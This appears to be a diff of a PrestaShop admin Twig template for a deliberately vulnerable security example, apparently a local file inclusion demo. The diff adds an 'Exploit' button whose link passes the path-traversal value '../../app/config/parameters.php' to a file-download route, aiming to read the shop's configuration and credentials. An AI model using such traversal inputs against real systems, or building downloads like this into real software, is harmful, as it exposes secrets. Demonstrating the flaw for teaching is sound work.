@@ -1,26 +1,31 @@
 {% extends '@PrestaShop/Admin/layout.html.twig' %}
 
 {% block content %}
-  {% if finder is not empty %}
-    <table class="table">
-      <thead>
+  <a class="btn btn-danger" href={{ path('security_examples_lfi_download', {file: '../../app/config/parameters.php'}) }}>
+    <i class="material-icons">
+      whatshot
+    </i>
+    Exploit
+  </a>
+
+  <table class="table">
+    <thead>
+      <tr>
+        <th scope="col">#</th>
+        <th scope="col">Filename</th>
+        <th scope="col">Download</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for file in finder %}
         <tr>
-          <th scope="col">#</th>
-          <th scope="col">Filename</th>
-          <th scope="col">Download</th>
+          <th scope="row">{{ loop.index }}</th>
+          <td>{{file.filename}}</td>
+          <td>
+            <a href={{ path('security_examples_lfi_download', {file: file.relativePathName}) }}>Download</a>
+          </td>
         </tr>
-      </thead>
-      <tbody>
-        {% for file in finder %}
-          <tr>
-            <th scope="row">{{ loop.index }}</th>
-            <td>{{file.filename}}</td>
-            <td>
-              <a href={{ path('security_examples_lfi_download', {file: file.relativePathName}) }}>Download</a>
-            </td>
-          </tr>
-        {% endfor %}
-      </tbody>
-    </table>
-  {% endif %}
+      {% endfor %}
+    </tbody>
+  </table>
 {% endblock %}
